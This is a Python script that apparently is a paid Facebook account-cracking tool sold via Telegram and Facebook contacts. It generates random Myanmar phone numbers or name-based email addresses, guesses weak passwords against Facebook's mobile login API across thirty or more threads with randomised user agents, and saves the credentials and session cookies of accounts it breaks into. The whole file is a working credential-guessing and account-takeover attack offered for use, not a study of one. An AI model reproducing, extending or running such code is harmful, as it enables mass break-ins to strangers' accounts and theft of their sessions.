import random, requests , re , sys , os , time, getpass
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    os.system('rm -rf mail_clone.py')
loop = 0
oks = []
cps = []
ses=requests.Session()

A = '\x1b[1;97m' 
B = '\033[1;32m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

#----------User Access Controler----------#👇

# import os, getpass, requests, sys

os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests bs4')
os.system('clear')          

approval_description = ("""
\033[0mTo buy this tool,
\033[0mplease connect from Facebook or Telegram.

\033[0mFacebook acc:  https://www.facebook.com/sknaing29
\033[0mFacebook page: https://www.facebook.com/MyanService
\033[0mTelegram acc:  https://t.me/YeMoeThaung
\033[0mTelegram page: https://t.me/MyanService
""")

print("Loading...")
url = "https://raw.githubusercontent.com/oakarminmg65/Fb-clone-paid-tool/main/ApprovedUsers.txt"
response = requests.get(url)
approved_users = response.text

user_id = str(os.geteuid())
user_name = getpass.getuser()
key = user_id + user_name

if key in approved_users:
    print("\nYour key: " + key)
    print("Your key is approved")
    # time.sleep(2)
else:
    print("\nYour key: " + key)
    print("Your key is not approved")
    print(approval_description)
    sys.exit()

#----------User Access Controler----------#👆

#----------POSSIBLE JOIN DATE----------#👇

def possible_join_date(acc_id):
    if not isinstance(acc_id, str):
        acc_id = str(acc_id)
    if len(acc_id) == 15:
        if acc_id[:10] in ['1000000000']:
            join_date = '2009'
        elif acc_id[:9] in ['100000000']:
            join_date = '2009'
        elif acc_id[:8] in ['10000000']:
            join_date = '2009'
        elif acc_id[:7] in ['1000000', '1000001', '1000002', '1000003', '1000004', '1000005']:
            join_date = '2009'
        elif acc_id[:7] in ['1000006', '1000007', '1000008', '1000009']:
            join_date = '2010'
        elif acc_id[:6] in ['100001']:
            join_date = '2010/2011'
        elif acc_id[:6] in ['100002', '100003']:
            join_date = '2011/2012'
        elif acc_id[:6] in ['100004']:
            join_date = '2012/2013'
        elif acc_id[:6] in ['100005', '100006']:
            join_date = '2013/2014'
        elif acc_id[:6] in ['100007', '100008']:
            join_date = '2014/2015'
        elif acc_id[:6] in ['100009']:
            join_date = '2015'
        elif acc_id[:5] in ['10001']:
            join_date = '2015/2016'
        elif acc_id[:5] in ['10002']:
            join_date = '2016/2017'
        elif acc_id[:5] in ['10003']:
            join_date = '2018/2019'
        elif acc_id[:5] in ['10004']:
            join_date = '2019'
        elif acc_id[:5] in ['10005']:
            join_date = '2020'
        elif acc_id[:5] in ['10006', '10007', '10008']:
            join_date = '2021/2022'
        else:
            join_date = '2023'
    elif len(acc_id) in [9, 10]:
        join_date = '2008/2009'
    elif len(acc_id) == 8:
        join_date = '2007/2008'
    elif len(acc_id) == 7:
        join_date = '2006/2007'
    else:
        join_date = '2023/2024'
    return join_date
# Example usage
# print(possible_join_date(100011709762932))

#----------POSSIBLE JOIN DATE----------#👆

#----------IP DETAILS----------#👇

def get_ip_details():
    # Get public IP address
    ip_response = requests.get('https://api.ipify.org?format=json')
    ip = ip_response.json()['ip']
    
    # Get details for the IP address
    details_response = requests.get(f'http://ip-api.com/json/{ip}')
    details_data = details_response.json()
    
    # Compile the desired information
    ip_info = {
        'country': details_data.get('country'),
        'city': details_data.get('city'),
        'isp': details_data.get('isp'),
        'ip': ip
    }
    
    return ip_info

try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()

"""
def windows():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])
"""

def uaa():
    android_versions = list(range(4, 13))
    samsung_models = ['Galaxy S6', 'Galaxy S7', 'Galaxy S8', 'Galaxy S9', 'Galaxy S10', 'Galaxy Note 5', 'Galaxy Note 8', 'Galaxy Note 9', 'Galaxy A5', 'Galaxy A7', 'Galaxy J5', 'Galaxy J7']
    huawei_models = ['P10', 'P20', 'P30', 'Mate 10', 'Mate 20', 'Y7', 'Y9', 'Nova 3i']
    xiaomi_models = ['Redmi Note 5', 'Redmi Note 6', 'Redmi Note 7', 'Redmi Note 8', 'Redmi Note 9', 'Mi A1', 'Mi A2', 'Mi 8', 'Mi 9', 'Poco F1']
    oppo_models = ['F7', 'F9', 'A3s', 'A5s', 'A7', 'A9', 'R11', 'R17', 'Reno 2', 'Reno 3']
    vivo_models = ['Y55', 'Y71', 'Y81', 'Y91', 'Y93', 'Y95', 'V9', 'V11', 'V15', 'S1']
    realme_models = ['C1', 'C2', '3 Pro', '5 Pro', 'X', 'X2']
    android_models = {
        'samsung': samsung_models,
        'huawei': huawei_models,
        'xiaomi': xiaomi_models,
        'oppo': oppo_models,
        'vivo': vivo_models,
        'realme': realme_models,
    }
    and_vers = random.choice(android_versions)
    brand = random.choice(list(android_models.keys()))
    and_mod = random.choice(android_models[brand])
    and_id = f'{random.randint(9,99)}.0.0.{random.randint(9,99)}{random.randint(9,99)}'
    app_uld = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
    app_ver = f'{random.randint(99,999)}.{random.randint(99,999)}.{random.randint(99,999)}.{random.randint(99,999)}'
    app_vercode = str(random.randint(100000000,999999999))
    pkg_name = random.choice(('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana'))
    ua = f'Dalvik/2.1.0 (Linux; U; Android {and_vers}; {brand} {and_mod} Build/SKQ1.{app_uld}) [FBAN/EMA;FBLC/en_US;FBAV/{app_ver};FBBV/{app_vercode};FBDV/{and_mod};FBMD/{brand};FBSN/{and_id};FBPN/{pkg_name}]'
    return ua

logo= ("""
\033[1;22mMozilla-StandardNull API P3
\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
\033[38;5;40m██╗    ██╗████████╗██╗  ██╗██████╗ ██████╗ 
\033[38;5;76m██║    ██║╚══██╔══╝██║  ██║██╔══██╗╚════██╗
\033[38;5;112m██║ █╗ ██║   ██║   ███████║██████╔╝ █████╔╝
\033[38;5;148m██║███╗██║   ██║   ╚════██║██╔═══╝ ██╔═══╝ 
\033[38;5;184m╚███╔███╔╝   ██║        ██║██║     ███████╗
\033[1;220m ╚══╝╚══╝    ╚═╝        ╚═╝╚═╝     ╚══════╝
\033[1;32m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
\033[38;5;45m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mOWNER           \033[38;5;226m ━━━━━    \033[1;32m Oakarmin mg          \033[38;5;45m┃
\033[38;5;43m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mTELEGRAM        \033[38;5;226m ━━━━━   \033[1;32m @wt4p2p. wtz          \033[38;5;43m┃
\033[38;5;43m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mMETHOD          \033[38;5;226m ━━━━━   \033[1;32m   API METHOD          \033[38;5;43m┃
\033[38;5;44m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mTOOL STATUS     \033[38;5;226m ━━━━━    \033[1;32mPAID VERSION          \033[38;5;44m┃
\033[38;5;42m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mTOOL VERSION    \033[38;5;226m ━━━━━     \033[1;32m      1.0.0          \033[38;5;42m┃
\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")

def linex():
	print(f'\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def main():
    os.system('clear')
    print(logo)
    print(" \033[1;32m〘\033[1;97m1\033[1;32m〙 \033[1;97mPHONE NUMBER CRACKING")
    print(" \033[1;32m〘\033[1;97m2\033[1;32m〙 \033[1;97mGMAIL CRACKING〘\033[1;32mFULL\033[1;97m〙")
    print(" \033[1;32m〘\033[1;97m3\033[1;32m〙 \033[1;97mGMAIL CRACKING〘\033[1;32mSINGLE\033[1;97m〙")
    print(" \033[1;32m〘\033[1;97m0\033[1;32m〙 \033[1;97mEXIT TOOL                     ")
    linex()
    ZWE = input(f'\033[1;32m 〘\033[1;97m?\033[1;32m〙 \033[1;97mSELECT \033[1;97m:\033[1;32m ')
    if ZWE in ["1","01"]:
        phone()
    if ZWE in ["2","02"]:
        gmail()
    if ZWE in ["3","03"]:
        single()
    if ZWE in ["0","X"]:        
        os.system('exit')

        ######def phone-----------####
def phone():
    user=[]
    os.system('clear')
    print(logo)
    print("\033[1;32m 〘\033[1;97m✔\033[1;32m〙\033[1;97m EXAMPLE : \033[1;32m〘\033[1;97m786\033[1;32m〙〘\033[1;97m440\033[1;32m〙〘\033[1;97m678\033[1;32m〙〘\033[1;97m699\033[1;32m〙")
    linex()
    code = input('\033[1;32m 〘\033[1;97m?\033[1;32m〙\033[1;97m INPUT YOUR CODE :\033[1;32m ')
    os.system('clear')
    print(logo)
    print("\033[1;32m 〘\033[1;97m✔\033[1;32m〙 \033[1;97mEXAMPLE : \033[1;32m〘\033[1;97m3000\033[1;32m〙〘\033[1;97m5000\033[1;32m〙〘\033[1;97m10000\033[1;32m〙")
    linex()
    limit=int(input("\033[1;32m 〘\033[1;32m?\033[1;32m〙\033[1;97m INPUT YOUR LIMIT :\033[1;32m "))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=30) as LEE:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'\033[1;32m 〘\033[1;97m✔\033[1;32m〙\033[1;97mTOTAL ID       \033[1;32m ║ \033[1;32m'+tl+'                   ')
        print(f'\033[1;32m 〘\033[1;97m✔\033[1;32m〙\033[1;97mCHOICE CODE    \033[1;32m ║ \033[1;32m'+code+'             ')
        print(f" \033[1;32m〘\033[1;97m✔\033[1;32m〙\033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
        linex()
        print(f"\033[1;22m{get_ip_details()}")
        for love in user:
            uid = '+959'+code+love
            pwx = [love,code+love,code+love[0:3]]
            LEE.submit(rcrack,uid,pwx,tl)        
#---------------def mail----------===       
def gmail():
                user=[]
                os.system('clear')
                print(logo)               
                print("\033[1;32m 〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m〘\033[1;97mtun\033[1;32m〙〘\033[1;97mzaw\033[1;32m〙〘\033[1;97maung\033[1;32m〙")
                linex()
                first = input('\033[1;32m 〘\033[1;97m?\033[1;32m〙\033[1;97mFIRST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m 〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m〘\033[1;97mlin\033[1;32m〙〘\033[1;97mhtet\033[1;32m〙〘\033[1;97mmin\033[1;32m〙")
                linex()
                last = input('\033[1;32m 〘\033[1;97m?\033[1;32m〙\033[1;97mLAST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m 〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m〘\033[1;97m@gmail.com\033[1;32m〙〘\033[1;97m@yahoo.com\033[1;32m〙")
                linex()
                domain = input('\033[1;32m 〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT DOMAIN :\033[1;32m ')               
                os.system('clear')
                print(logo)
                print("\033[1;32m 〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m〘\033[1;97m3000\033[1;32m〙〘\033[1;97m5000\033[1;32m〙〘\033[1;97m10000\033[1;32m〙")
                linex()
                try:
                        limit=int(input("\033[1;32m 〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT YOUR LIMIT :\033[1;32m "))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp="".join(random.choice(string.digits) for _ in range(1,5))
                        user.append(nmp)                               
                with ThreadPool(max_workers=30) as LEE:
                        tl = str(len(user))
                        os.system('clear')
                        print(logo)
                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mTOTAL ID        \033[1;32m║ \033[1;32m'+tl+'  ')
                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mCRACK NAME      \033[1;32m║ \033[1;32m'+first+last+'')
                        print(f" \033[1;32m 〘\033[1;97m✔\033[1;32m〙\033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
                        linex()
                        for digitx in user:                       
                                uid=random.choice([first+last+'.'+digitx+domain,first+last[0:1]+'.'+digitx+domain,last+first+'.'+digitx+domain])
                                pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
                                LEE.submit(rcrack,uid,pwx,tl)
 #----------def singel------------#                               
def single():
                user=[]
                os.system('clear')
                print(logo)               
                print("\033[1;32m 〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m〘\033[1;97mwailin\033[1;32m〙〘\033[1;97mzawmyo\033[1;32m〙〘\033[1;97mphyowai\033[1;32m〙")
                linex()
                first = input('\033[1;32m 〘\033[1;97m?\033[1;32m〙\033[1;97mSINGLE NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m 〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m〘\033[1;97m@gmail.com\033[1;32m〙〘\033[1;97m@yahoo.com\033[1;32m〙")
                linex()
                domain = input('\033[1;32m 〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT DOMAIN :\033[1;32m ')               
                os.system('clear')
                print(logo)
                print("\033[1;32m 〘\033[1;97m✔\033[1;32m〙\033[1;97mEXAMPLE : \033[1;32m〘\033[1;97m3000\033[1;32m〙〘\033[1;97m5000\033[1;32m〙〘\033[1;97m10000\033[1;32m〙")
                linex()
                try:
                        limit=int(input("\033[1;32m 〘\033[1;97m?\033[1;32m〙\033[1;97mINPUT YOUR LIMIT :\033[1;32m "))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp="".join(random.choice(string.digits) for _ in range(1,5))
                        user.append(nmp)                               
                with ThreadPool(max_workers=40) as LEE:
                        tl = str(len(user))
                        os.system('clear')
                        print(logo)
                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mTOTAL ID        \033[1;32m║ \033[1;32m'+tl+'  ')
                        print(f'\033[1;32m  〘\033[1;97m✔\033[1;32m〙\033[1;97mCRACK NAME      \033[1;32m║ \033[1;32m'+first+'')
                        print(f"  \033[1;32m〘\033[1;97m✔\033[1;32m〙\033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
                        linex()
                        for digitx in user:                       
                                uid=first+'.'+digitx+domain
                                pwx=[digitx+first,first+digitx,first,first+'123',first+'1234',first+'12345',first+'@123',first+'1122']
                                LEE.submit(rcrack,uid,pwx,tl)                                

def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            session = requests.Session()
            pro = uaa()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r\r \033[1;32m〘%sMYAN-2\033[1;32m〙\033[1;34m\033[1;32m〘\033[38;5;195m%s/%s\033[1;32m〙\033[1;32mOK-%s\r'      %    (bi,loop,tl,len(oks)))
            sys.stdout.flush()
            data={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': uid,
            'password': ps,
            'generate_analytics_claims': '1',
            'community_id': '',
            'cpl': 'true',
            'try_num': '1',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'currently_logged_in_userid': '0',
            'locale': 'en_GB',
            'client_country_code': 'GB',
            'fb_api_req_friendly_name': 'authenticate'}
            head={
            'User-Agent': pro,
            'Accept-Encoding':  'gzip, deflate',
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-Friendly-Name': 'authenticate',
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown',
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-FB-HTTP-Engine': 'Liger'}
            url1= 'https://b-graph.facebook.com/auth/login'
            lo=session.post(url1,data=data,headers=head).json()
            if 'session_key' in lo:
                coki=";".join(i["name"]+"="+i["value"] for i in lo["session_cookies"])	
                print(f"\033[1;32m❮✔❯ {uid} | {ps} ──≻> {possible_join_date(uid)}\n\033[1;97m❮COOKIE❯ = \033[1;97m{coki}")
                linex()
                open('/sdcard/MYAN-2-OK.txt', 'a').write(f"❮✔❯ {uid} | {ps} ──≻> {possible_join_date(uid)}\n❮COOKIE❯ = {coki}\n❮User-Agent❯ = {pro}\n\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in str(lo):            	
                print(f"\x1b[1;90m❮✘❯ {uid} | {ps}")
                open('/sdcard/MYAN-2-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break            
            else:
                continue
        loop+=1 
        sys.stdout.write(f'\r\r \033[1;32m〘%sMYAN-2\033[1;32m〙\033[1;34m\033[1;32m〘\033[38;5;195m%s/%s\033[1;32m〙\033[1;32mOK-%s\r'    %  (bi,loop,tl,len(oks)))
        sys.stdout.flush()
    except:
        pass
main()        
        